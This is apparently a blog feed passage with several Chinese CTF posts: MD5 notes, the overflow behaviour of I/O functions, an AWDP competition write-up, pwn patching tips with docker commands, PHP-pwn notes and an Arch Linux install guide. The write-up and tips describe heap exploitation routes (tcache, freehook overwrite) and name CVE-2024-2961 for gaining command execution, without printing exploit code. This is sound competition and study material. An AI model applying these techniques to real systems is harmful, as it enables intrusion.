class="subst">&#123;decrypted_v2&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><h1>XTea/XXTea</h1><h1>MD5</h1><h2 id="识别-5">识别</h2><p>128位散列值，需要一个context结构体，分三步，init，updatestring和final</p><p>其中init过程会将context初始化为4个固定的magic_number:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">MD5Init</span> <span class="params">(MD5_CTX *context)</span></span><br><span class="line"><span class="comment">/*context*/</span></span><br><span class="line">&#123;</span><br><span class="line">    context-&gt;count[<span class="number">0</span>] = context-&gt;count[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">/* Load magic initialization constants. */</span></span><br><span class="line">    context-&gt;state[<span class="number">0</span>] = <span class="number">0x67452301</span>;</span><br><span class="line">    context-&gt;state[<span class="number">1</span>] = <span class="number">0xefcdab89</span>;</span><br><span class="line">    context-&gt;state[<span class="number">2</span>] = <span class="number">0x98badcfe</span>;</span><br><span class="line">    context-&gt;state[<span class="number">3</span>] = <span class="number">0x10325476</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="IO-6">IO</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="comment"># 要计算哈希值的字符串</span></span><br><span class="line">data = <span class="string">&quot;Hello, World!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个 MD5 哈希对象</span></span><br><span class="line">md5_hash = hashlib.md5()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 更新哈希对象</span></span><br><span class="line">md5_hash.update(data.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取十六进制的哈希值</span></span><br><span class="line">hash_value = md5_hash.hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;MD5 Hash: <span class="subst">&#123;hash_value&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;参考自 &lt;a href=&quot;https://www.cnblogs.com/Moomin/p/15004170.html#aes&quot;&gt;https://www.cnblogs.com/Moomin/p/15004170.html#aes&lt;/a&gt;&lt;/p&gt;
</summary>
      
    
    
    
    
    <category term="pwn" scheme="https://zjw1nd.github.io/tags/pwn/"/>
    
    <category term="逆向" scheme="https://zjw1nd.github.io/tags/%E9%80%86%E5%90%91/"/>
    
    <category term="basic" scheme="https://zjw1nd.github.io/tags/basic/"/>
    
  </entry>
  
  <entry>
    <title>简短的IO函数特性整理——受scanf启发</title>
    <link href="https://zjw1nd.github.io/2025/03/11/%E7%AE%80%E7%9F%AD%E7%9A%84%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA%E5%87%BD%E6%95%B0%E7%89%B9%E6%80%A7%E6%95%B4%E7%90%86%E2%80%94%E2%80%94%E5%8F%97scanf%E5%90%AF%E5%8F%91/"/>
    <id>https://zjw1nd.github.io/2025/03/11/%E7%AE%80%E7%9F%AD%E7%9A%84%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA%E5%87%BD%E6%95%B0%E7%89%B9%E6%80%A7%E6%95%B4%E7%90%86%E2%80%94%E2%80%94%E5%8F%97scanf%E5%90%AF%E5%8F%91/</id>
    <published>2025-03-11T12:50:37.000Z</published>
    <updated>2025-03-17T14:28:27.890Z</updated>
    
    <content type="html"><![CDATA[<p>来源于互联网而非自己手动调试，供参考，是否真实一试便知，仅供备忘。</p><h1>输入</h1><h1>gets(buf)</h1><ul class="lvl-0"><li class="lvl-2">是否能溢出：不检查长度，任意溢出</li><li class="lvl-2">截断要求：换行截断(\n,\x0a)和EOF截断。换行符会被丢弃。其他空白字符均会原本输入。</li><li class="lvl-2">其他处理：结尾自动添加\x00</li></ul><h1>read(0,buf,cnt)</h1><p>作为一个系统调用，和其他的输入函数确实有本质区别。</p><ul class="lvl-0"><li class="lvl-2"><p>是否能溢出：参数3有长度限制，不合理时可能导致溢出。</p></li><li class="lvl-2"><p>截断要求：没有截断字符，读够缓冲区数据或cnt字节后立刻返回。其中终端默认规范下回车会导致提交，结果中会包含有\n存在。默认情况下read在没有可用数据时会阻塞。</p></li></ul><p>可以说是最通用的，直接在pwntools中调用send就可以无损发送数据。</p><h1>scanf</h1><p><a href="https://blog.csdn.net/qq_54218833/article/details/121308367">参考文章</a><br>scanf的输入方式取决于其格式化占位符。我们下面重点关注存在溢出的%s</p><ul class="lvl-0"><li class="lvl-2"><p>是否能溢出：取决于格式化字符串。其中’%s’并不检查输入长度，数字</p></li><li class="lvl-2"><p>截断要求：注意，scanf由空格区分不同的格式化参数，**即scanf(‘%s’)是空格(\x20)截断的。**另外反直觉的是，scanf(‘%s’)没有0截断。</p></li></ul><h1>puts</h1><ul class="lvl-0"><li class="lvl-2"><p>末尾自动额外添加换行’\n’</p></li><li class="lvl-2"><p>0截断</p></li></ul><h1>printf</h1><p>和scanf类似，输出方式取决于格式化字符串fmt参数的设置。我们这里不谈格式化字符串的漏洞</p><ul class="lvl-0"><li class="lvl-2"><p>%s就是输出字符串</p></li></ul><h1>write</h1><p>写入文件描述符，我们重点关注write(1,buf,cnt)</p><ul class="lvl-0"><li class="lvl-2"><p>没有任何截断或换行，单纯打印到标准输出流。</p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;来源于互联网而非自己手动调试，供参考，是否真实一试便知，仅供备忘。&lt;/p&gt;
&lt;h1&gt;输入&lt;/h1&gt;
&lt;h1&gt;gets(buf)&lt;/h1&gt;
&lt;ul class=&quot;lvl-0&quot;&gt;
&lt;li class=&quot;lvl-2&quot;&gt;是否能溢出：不检查长度，任意溢出&lt;/li&gt;
&lt;li class</summary>
      
    
    
    
    
    <category term="pwn" scheme="https://zjw1nd.github.io/tags/pwn/"/>
    
    <category term="basic" scheme="https://zjw1nd.github.io/tags/basic/"/>
    
  </entry>
  
  <entry>
    <title>2023ciscn决赛awdp复现思路</title>
    <link href="https://zjw1nd.github.io/2025/03/10/2023ciscn%E5%86%B3%E8%B5%9Bawdp%E5%A4%8D%E7%8E%B0%E6%80%9D%E8%B7%AF/"/>
    <id>https://zjw1nd.github.io/2025/03/10/2023ciscn%E5%86%B3%E8%B5%9Bawdp%E5%A4%8D%E7%8E%B0%E6%80%9D%E8%B7%AF/</id>
    <published>2025-03-10T12:16:09.000Z</published>
    <updated>2025-07-22T08:39:24.232Z</updated>
    
    <content type="html"><![CDATA[<h1>CarManager</h1><p>难点在于数据结构套数据结构，频繁的进行混乱的写入和释放，检查是否出现UAF和溢出比较浪费时间，赛场上估计很容易漏。分为用户-car-comment三套东西的菜单，每个都能删改查并且代码风格不统一。</p><p>最显眼的是一个格式化字符串漏洞，但是利用需要过一个challenge，开始看不懂以为是什么简单的对称加密，搜的题的wp也没有这个部分，结果给ai说是个数独，笑了。</p><p>第二显眼的是malloc参数取决于用户输入</p><p>wp说的UAF觉得是false positive了，堆溢出确实隐蔽，是一个strlen确定size的时候导致的，如果chunk写满了会让strlen变大？可以做溢出</p><h1>codelog</h1><p>到处是这种输入谁能保准没问题啊，老老实实read不好吗…</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> __fastcall <span class="title function_">sub_401536</span><span class="params">(_BYTE *a1, <span class="type">ssize_t</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">ssize_t</span> v2; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = a2--;</span><br><span class="line">    LOBYTE(v2) = v2 != <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !(_BYTE)v2 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v2 = read(<span class="number">0</span>, a1, <span class="number">1uLL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !v2 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v2 == <span class="number">-1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *__errno_location() != <span class="number">11</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        LODWORD(v2) = *__errno_location();</span><br><span class="line">        <span class="keyword">if</span> ( (_DWORD)v2 != <span class="number">4</span> )</span><br><span class="line">          <span class="keyword">return</span> v2;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *a1 == <span class="number">10</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        LOBYTE(v2) = (_BYTE)a1;</span><br><span class="line">        *a1 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> v2;</span><br><span class="line">      &#125;</span><br><span class="line">      ++a1;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>假的shell，支持9个操作这个程序的sb地方在于似乎逆向存在问题，局部参数在函数内部直接用rbp+0x10和rbp+0x18访问，而64位中间的那些寄存器参数全部弃用了？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004029FF loc_4029FF:                             ; CODE XREF: main+C7↑j</span><br><span class="line">.text:00000000004029FF                                         ; DATA XREF: .rodata:jpt_4029FC↓o</span><br><span class="line">.text:00000000004029FF                 lea     rax, [rbp+var_70] ; jumptable 00000000004029FC case 0</span><br><span class="line">.text:0000000000402A03                 push    [rbp+var_28]</span><br><span class="line">.text:0000000000402A06                 push    [rbp+var_30]</span><br><span class="line">.text:0000000000402A09                 push    [rbp+var_38]</span><br><span class="line">.text:0000000000402A0C                 push    [rbp+var_40]</span><br><span class="line">.text:0000000000402A0F                 mov     rdi, rax</span><br><span class="line">.text:0000000000402A12                 call    sub_401C2E</span><br></pre></td></tr></table></figure><p>有病是吧</p><p>已出，题目花里胡哨，但是事实上malloc和free的地方很少，这就带来了一个好处，即我们确定溢出点后，只需要跟踪所有可能的分配和释放就行了，完全不要去逆向程序到底在干嘛（说实话数据结构极其混乱）</p><p>定好溢出点之后就在这里打断点，然后用所有其他的东西去给这个溢出点做堆风水，打tcache写freehook一把梭。另外，scanf(%s)出乎意料的能输入\x00，反而会被空格(\x20)截断。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;CarManager&lt;/h1&gt;
&lt;p&gt;难点在于数据结构套数据结构，频繁的进行混乱的写入和释放，检查是否出现UAF和溢出比较浪费时间，赛场上估计很容易漏。分为用户-car-comment三套东西的菜单，每个都能删改查并且代码风格不统一。&lt;/p&gt;
&lt;p&gt;最显眼的是一个格式化字</summary>
      
    
    
    
    <category term="WP" scheme="https://zjw1nd.github.io/categories/WP/"/>
    
    
    <category term="awdp" scheme="https://zjw1nd.github.io/tags/awdp/"/>
    
    <category term="pwn" scheme="https://zjw1nd.github.io/tags/pwn/"/>
    
    <category term="wp" scheme="https://zjw1nd.github.io/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>Awdp-PWN准备技巧</title>
    <link href="https://zjw1nd.github.io/2025/02/25/Awdp-PWN%E5%87%86%E5%A4%87%E6%8A%80%E5%B7%A7/"/>
    <id>https://zjw1nd.github.io/2025/02/25/Awdp-PWN%E5%87%86%E5%A4%87%E6%8A%80%E5%B7%A7/</id>
    <published>2025-02-25T11:40:53.000Z</published>
    <updated>2025-03-17T14:14:23.956Z</updated>
    
    <content type="html"><![CDATA[<h1>环境问题</h1><p>首先，我有两套环境。一个windows一个arch，都是物理机。</p><p>其中，windows上拥有kali-wsl和win_penetration_toolkit-vmware，平常的pwn题是采用</p><ul class="lvl-0"><li class="lvl-2"><p>wsl-kali执行python脚本/gdb调试，patchelf+glibc-all-in-one，windows主机ida分析</p></li></ul><p>缺点是，windows上没有docker。做不了内核题。优点是，windows上具有渗透测试的虚拟机，可以说渗透基本上必须用win（blackarch开发不是很全）</p><p>而linux环境上也有原生ida支持，也能做，缺点在于没有杂七杂八的工具比如anytxt，localsend这种，也缺misc工具，以及渗透的工具。</p><p>linux准备好ubuntu的三个docker，都安装gdb？</p><h2 id="pwn题配置">pwn题配置</h2><p>参考自<a href="https://blog.csdn.net/qq_38154820/article/details/119259414">文章1</a></p><p><a href="https://xz.aliyun.com/news/13321?time__1311=eqUxuDcDBGe7qRxBqDwjDAh%2BO3phwBbD&amp;u_atoken=9d921b0c0075e2df58d83b37a58c5b31&amp;u_asig=0a47315217404858836656288e003d">文章2(包括流量转发，批量攻击脚本)</a></p><h1>准备</h1><p>手动patch，使用ida keypatch即可。打包命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">tar -cvf archive.tar file1 file2 directory</span><br><span class="line">tar -czvf archive.tar.gz directory</span><br><span class="line">tar -rvf archive.tar newfile</span><br><span class="line"></span><br><span class="line">tar -xvf archive.tar</span><br><span class="line">tar -zcvf update.tar.gz update.sh pwn_fix</span><br></pre></td></tr></table></figure><h1>常见漏洞的patch方法</h1><h2 id="格式化字符串漏洞">格式化字符串漏洞</h2><ol><li class="lvl-3"><p>printf=&gt;puts,直接改call的地址即可。风险是puts会在结尾添加换行，不一定能过检查。</p></li><li class="lvl-3"><p>强行调整参数。rdi放&quot;%s&quot;，rsi放原参数。程序里有%s在的话会好一点，如果没有%s的话，我们可能要找3字节塞进去如下内容：</p></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x25 0x73 0x00== %s\0</span><br></pre></td></tr></table></figure><p>但是指令也可能不够长？</p><h2 id="UAF">UAF</h2><blockquote><p>“UAF就直接把free nop掉” ——某位大跌学长</p></blockquote><p>check过程中没办法检查是否有free，所以直接nop掉free似乎是个不错的方案。反正也爆不了，内存就在那扔着你也不能怎么样</p><h2 id="整数溢出">整数溢出</h2><p>整数溢出比较简单，修改相应判断指令的跳转逻辑就行（？）将有符号跳转改为无符号？</p><h2 id="缓冲区溢出">缓冲区溢出</h2><p>改小相关的输入长度,分x86和x64，写死的数值参数x86需要patch push指令，但是注意，在操作数大于0x100的时候push内容可能会变化，涉及到栈平衡的问题需要注意。<br>x64就直接patch寄存器赋值即可。</p><p>scanf的话尝试将&quot;%s&quot;改成&quot;%ns&quot;来限制输入长度，如果长度是动态的尝试了下改成read(0,buf,len)一般汇编也是够的</p><h2 id="VM">VM</h2><p>核心是防止在vm指令执行过程中越界/非预期的读写，具体问题具体分析，肯定会有执行指令过程中的check漏洞</p><h2 id="逻辑漏洞">逻辑漏洞</h2><p>nop漏洞分支（nop掉跳转指令）敏感函数的参数权限（如mmap等）</p><h2 id="通防">通防</h2><p>给程序加沙箱直接无脑关闭execve调用，但是通防可能被检测，自行斟酌<br><a href="https://github.com/TTY-flag/evilPatcher">https://github.com/TTY-flag/evilPatcher</a></p><p>测试下来，二进制文件大小没有变化，线下试试吧。</p><p>或者还有一招，如果程序设置了alarm(xx)的话（一般会有alarm(60)）这种限制时间的，测试下之后把它改的很小让exp利用不完，也能行。</p><h2 id="非预期？">非预期？</h2><p>程序如果exit退出，打io的话尝试nop掉exit或者改成_exit？</p><h1>检查漏洞</h1><p>敏感功能函数，strlen获取长度限制能不能塞满溢出，scanf%s的输入</p><h1>docker命令</h1><p>pwn调试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">docker run -it -d -v host_path:container_path -p host_port:container_port --cap-add=SYS_PTRACE IMAGE_ID # auto update 自动执行update.sh脚本</span><br><span class="line"></span><br><span class="line">docker run -it -d -v host_path:container_path -p host_port:container_port --cap-add=SYS_PTRACE IMAGE_ID /bin/sh # do not update 不会自动更新</span><br><span class="line"></span><br><span class="line">docker run -it -d -v host_path:container_path -p host_port:container_port --privileged IMAGE_ID # privileged enabled and auto update 给特权标志和自动更新</span><br><span class="line"></span><br><span class="line">docker run -it -d -v host_path:container_path -p host_port:container_port --privileged IMAGE_ID /bin/sh # privileged enabled and auto update 给特权标志和自动更新</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">docker run -it -d -v $PWD:/home/ctf/hacker</span><br><span class="line"></span><br><span class="line">docker exec -it CONTAINER_ID /bin/sh</span><br><span class="line">docker exec -it -u root CONTAINER_ID /bin/sh</span><br><span class="line"></span><br><span class="line">/bin/test-this-container.sh</span><br></pre></td></tr></table></figure><p>用官方镜像启动本地环境：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker load -i xxx.tar</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker ps -a --no-trunc 输出所有命令</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1>PHP PWN???</h1><blockquote><p>2025.3.17: 事实上根本就没工夫看这题…</p></blockquote><p>赛前发的附件名字叫php-master怀疑要出php-pwn了，搜了下结果还挺常见的但是都没做过，麻。先速通一下fix？</p><p>PHP pwn的核心是一个C编写的扩展动态库，为php提供一些可用的函数。</p><h2 id="环境搭建">环境搭建</h2><p>php的版本也比较多，准备8.1-8.3的docker和本机的8.4.4，以及7.4备用</p><p>实际操作时，去对应docker下将/usr/src的源码解压。找到源码目录的ext，ext_skel.php，这个脚本可以自动生成一套扩展用的基础文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">创建容器: docker run -itd --name php -p 80:80 -v /Users/xiaosheng/docker:/var/www/html -v /Users/xiaosheng/docker/etc:/usr/local/etc -v /Users/xiaosheng/docker/conf:/etc/apache2/sites-enabled php:apache-buster</span><br><span class="line">命令详解:</span><br><span class="line">--name php: php 表示创建出来的镜像名称</span><br><span class="line">-p 80:80: 表示本机的 80 端口映射到容器内的 80 端口, 其中第一个 80 是本机的</span><br><span class="line">-v /Users/xiaosheng/docker:/var/www/html: 数据卷挂载, 将本机的代码文件夹映射到容器内的代码文件夹, 冒号前面的是本机的文件夹地址</span><br><span class="line">-v /Users/xiaosheng/docker/etc:/usr/local/etc: 将容器内 PHP 的配置文件映射到本机, 这样方便修改配置文件, 冒号前面的是本地的文件夹地址</span><br><span class="line">-v /Users/xiaosheng/docker/conf:/etc/apache2/sites-enabled: 将容器内 Apache 站点的配置文件映射到本地, 方便添加和修改站点配置文件, 冒号前面的是本地的文件夹地址</span><br><span class="line">php:apache-buster: 表示的是使用哪个镜像来创建容器, 即 镜像名称:tag名称、</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">容器中 PHP 没有 MySQL 的扩展, 所以需要自己手动下载, 下载步骤可以参考该链接 https://www.yoyoask.com/?p=122</span><br><span class="line">docker-php-source : 在 /usr/src 目录下创建出来 php 文件夹</span><br><span class="line">进入 /usr/src/php/ext 文件夹, 使用 docker-php-ext-install 安装所需要的扩展, 如安装 pdo-mysql 扩展, 可以使用 docker-php-ext-install pdo_mysql 来安装</span><br><span class="line">修改 PHP 的配置文件</span><br><span class="line">去掉 ;extension=pdo_mysql 前面的 ;</span><br><span class="line">使用 docker restart 容器ID 来重启容器</span><br></pre></td></tr></table></figure><p>php的核心配置文件在php.ini 执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php --ini</span><br></pre></td></tr></table></figure><p>命令来输出所有的配置文件位置</p><h2 id="思路">思路</h2><p>首先，直接读/proc/self/map来拿地址，不多bb</p><p>然后php堆类似于linux内核的slab，没有复杂的metadata，而是通通用bucket管理，空闲链表也是类似tcache直接fd连接有UAF的话随便改。</p><p>fix的话可以考虑nop掉efree</p><h2 id="逆向结构体">逆向结构体</h2><p>module_entry:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">struct  _zend_module_entry &#123;</span><br><span class="line">                        unsigned short size;</span><br><span class="line">unsigned int zend_api;</span><br><span class="line">unsigned char zend_debug;</span><br><span class="line">unsigned char zts;</span><br><span class="line">void *ini_entry;</span><br><span class="line">void *deps;</span><br><span class="line">const char *name;</span><br><span class="line">void* functions;</span><br><span class="line">void* module_start_up_func</span><br><span class="line">void* module_shutdown_func;</span><br><span class="line">void* request_startup_func;</span><br><span class="line">void* request_shutdown_func;</span><br><span class="line">void *info_func;</span><br><span class="line">const char *version;</span><br><span class="line">size_t globals_size;</span><br><span class="line">void* globals_id_ptr;</span><br><span class="line">void* globals_ptr;</span><br><span class="line">void* globals_ctor;</span><br><span class="line">void* globals_dtor;</span><br><span class="line">void* post_deactivate_func;</span><br><span class="line">int module_started;</span><br><span class="line">unsigned char type;</span><br><span class="line">void* handle;</span><br><span class="line">int module_number;</span><br><span class="line">const char *build_id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>6:str<br>7:arr<br>4:int?</p><h2 id="patch">patch</h2><p>off by null(D^3CTF 2024 pwnshell)</p><h2 id="非预期">非预期</h2><p>cve-2024-2961，借助libc的溢出从文件包含提升至命令执行。现成exp环境配好了，搜到的去年决赛pwn的awdp中php可以用这个一键打通，万一呢</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;环境问题&lt;/h1&gt;
&lt;p&gt;首先，我有两套环境。一个windows一个arch，都是物理机。&lt;/p&gt;
&lt;p&gt;其中，windows上拥有kali-wsl和win_penetration_toolkit-vmware，平常的pwn题是采用&lt;/p&gt;
&lt;ul class=&quot;lvl-</summary>
      
    
    
    
    <category term="pwn" scheme="https://zjw1nd.github.io/categories/pwn/"/>
    
    
    <category term="awdp" scheme="https://zjw1nd.github.io/tags/awdp/"/>
    
    <category term="pwn" scheme="https://zjw1nd.github.io/tags/pwn/"/>
    
    <category term="awd" scheme="https://zjw1nd.github.io/tags/awd/"/>
    
    <category term="php" scheme="https://zjw1nd.github.io/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>Arch安装备忘手册</title>
    <link href="https://zjw1nd.github.io/2025/02/24/Arch%E5%AE%89%E8%A3%85%E5%A4%87%E5%BF%98%E6%89%8B%E5%86%8C/"/>
    <id>https://zjw1nd.github.io/2025/02/24/Arch%E5%AE%89%E8%A3%85%E5%A4%87%E5%BF%98%E6%89%8B%E5%86%8C/</id>
    <published>2025-02-24T08:30:11.000Z</published>
    <updated>2025-03-11T12:44:09.964Z</updated>
    
    <content type="html"><![CDATA[<p><strong>首先的首先，最重要的参考来自于<a href="https://arch.icekylin.online/guide/rookie/pre-install.html">archlinux简明指南</a></strong>。</p><h1>写在前面</h1><p>这篇文章的目的是整齐，简明地归纳笔者自己日常linux所接触到的一些经验，免得在搜索引擎屎里淘金。但是作者本人的记性很不好，所以可能有所缺疏。特别地，本文尤其针对的是<code>ArchLinux</code>这一发行版。</p><h1>你是否需要从0开始安装一个基本系统？</h1><p>直接参考<a href="https://arch.icekylin.online/guide/rookie/pre-install.html">archlinux简明指南</a>，正如指南中强调的，不要试图更改一些指南中提供的设置，除非你<strong>真的真的完全知道</strong>自己在做什么。这部分的经验对于所有操作系统应当都是类似的。</p><p>简单来说就是：</p><ul class="lvl-0"><li class="lvl-2"><p>同步时间，联网，换源</p></li><li class="lvl-2"><p>分区和格式化，efi，交换分区和主分区（btrfs）</p></li><li class="lvl-2"><p>挂载并安装系统，设置基本信息如时区，用户名密码</p></li><li class="lvl-2"><p>安装引导程序和其他必须组件</p></li></ul><p>由于pacman的强大，过程并不困难</p><h2 id="btrfs">btrfs</h2><blockquote><p>同样，可以阅读archlinux简明指南上的<a href="https://arch.icekylin.online/guide/advanced/btrfs.html">介绍</a>不要安装传统的ext4 linux文件系统，使用更好的btrfs。我们不关心具体怎么实现的，只知道这是一个提供了很多很好特性的文件系统即可。</p></blockquote><p>尤其是对于：</p><ul class="lvl-0"><li class="lvl-2"><p>SSD的大幅优化，包括写时复制和透明压缩特性</p></li><li class="lvl-2"><p>子卷和克隆特性让其支持非常方便的快照（甚至是快照的快照）</p></li></ul><p>其中，后者特性对于archlinux是非常重要的，因为arch不停地在滚动更新，我们折腾的时候会非常有帮助。采用神奇的btrfs后，我们的系统就能用<strong>极其</strong>小的空间进行增量快照备份。（而相对的，使用ext4符合我们的直觉——快照需要拷贝整个磁盘）</p><h2 id="这一部分的快速命令指南：">这一部分的快速命令指南：</h2><p>LiveCD使用windows下的rufus制作。下面我会列出archlinux简明指南上所有相关的命令和作用。这一部分假设不会遇到任何的问题和报错。</p><blockquote><p>LiveCD环境下:</p></blockquote><h3 id="同步时间，联网，换源">同步时间，联网，换源</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">#-- 禁用镜像内的自动更新源服务，人在国外的就无所谓了</span><br><span class="line">systemctl stop reflector.service</span><br><span class="line"># 检查状态</span><br><span class="line">systemctl status reflector.service</span><br><span class="line"></span><br><span class="line">#-- 无线连接网络，有线应当自动连接</span><br><span class="line">iwctl # 进入交互式命令行</span><br><span class="line">device list # 列出无线网卡设备名，比如无线网卡看到叫 wlan0</span><br><span class="line">station wlan0 scan # 扫描网络</span><br><span class="line">station wlan0 get-networks # 列出所有 wifi 网络</span><br><span class="line">station wlan0 connect wifi-name # 进行连接，注意这里无法输入中文。回车后输入密码即可</span><br><span class="line">exit # 连接成功后退出</span><br><span class="line"></span><br><span class="line">#-- 更新时钟</span><br><span class="line">timedatectl set-ntp true</span><br><span class="line"># 检查</span><br><span class="line">timedatectl status</span><br><span class="line"></span><br><span class="line">#--换源</span><br><span class="line">vim /etc/pacman.d/mirrorlist</span><br><span class="line"># 添加国内源，如果自己的学校有优先用自己的，放在最上面</span><br><span class="line"># 不要在这一步添加archlinuxcn</span><br><span class="line">Server = https://mirrors.hust.edu.cn/archlinux/$repo/os/$arch # 华科的</span><br><span class="line">Server = https://mirrors.ustc.edu.cn/archlinux/$repo/os/$arch # 